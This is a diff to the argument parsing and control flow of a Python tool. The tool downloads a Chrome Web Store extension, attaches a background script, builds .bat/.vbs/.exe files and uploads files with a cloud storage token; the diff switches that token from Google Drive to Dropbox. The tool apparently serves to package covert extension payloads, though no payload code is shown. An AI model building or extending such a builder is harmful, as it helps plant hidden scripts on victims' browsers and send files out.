@@ -40,7 +40,7 @@ def main() :
 		parser.add_argument('--extension', help="Download a extension from Google Chrome Webstore", type=str, required="true")
 		parser.add_argument('--load', help='Load a script to run in background with the application', type=str)
 		parser.add_argument('--build', help='Build types .bat\n.exe\n.vbs', type=str)
-		parser.add_argument('--token', help='Token for uploading files in Google Drive', type=str)
+		parser.add_argument('--token', help='Token for uploading files in Dropbox', type=str)
 
 		args = parser.parse_args()
 
@@ -65,15 +65,11 @@ def main() :
 		if not len(token) == 64:
 			print("{} Token invalid, enter a valid.".format(color.error("[!]")))
 			sys.exit(1)
-		elif not builds == "bat" or builds == "vbs" :
-			print("{} You need enter with option --build".format(color.error("[!]")))
-			sys.exit(1)
 		else :
 			Drive(extension, token).upload()
-			if builds == "bat" or builds == "vbs":
-				builder = Build(extension, builds, token).builder()
-
-
+			
+	if builds == "bat" or builds == "vbs":
+		builder = Build(extension, builds, token).builder()
 
 if __name__== "__main__" :
 
